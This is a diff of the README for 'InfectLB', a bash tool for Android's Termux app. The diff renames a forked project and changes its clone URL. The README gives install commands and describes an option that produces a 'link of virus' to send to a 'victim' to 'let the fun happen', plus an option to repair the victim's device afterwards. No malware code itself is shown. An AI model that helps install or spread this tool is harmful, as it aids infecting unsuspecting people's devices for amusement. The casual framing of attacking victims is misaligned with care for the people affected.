@@ -53,10 +53,10 @@ InfectLB is a bash based script which is officially made for termux users and fr
 * `pkg install python2 -y`
 * `pkg install git -y`
 * `pip install lolcat`
-* `git clone https://github.com/noob-hackers/infect`
+* `git clone https://github.com/lbkassar/infectlb.git`
 * `cd $HOME`
 * `ls`
-* `cd infect`
+* `cd infectlb`
 * `ls`
 * `bash infect.sh`
 ```
@@ -66,17 +66,17 @@ InfectLB is a bash based script which is officially made for termux users and fr
 ```
 ## USAGE OPTIONS [Termux] :
 
-__INFECT__ :
+__INFECTLB__ :
 - From this option you will get link of virus in your termux just send that link to your victim and let the fun happen.
 
 __SAVE__ :
 - From this option you can repair damaged device of your victm from that virus by just installing this anti-virus in his device.
 
 __UPDATE__ :
-- From this option you can update the infect script.
+- From this option you can update the infectLB script.
 
 __EXIT__ :
-- From this option you can exit from infect tool 
+- From this option you can exit from infectLB tool 
 
 
 ## WARNING : 
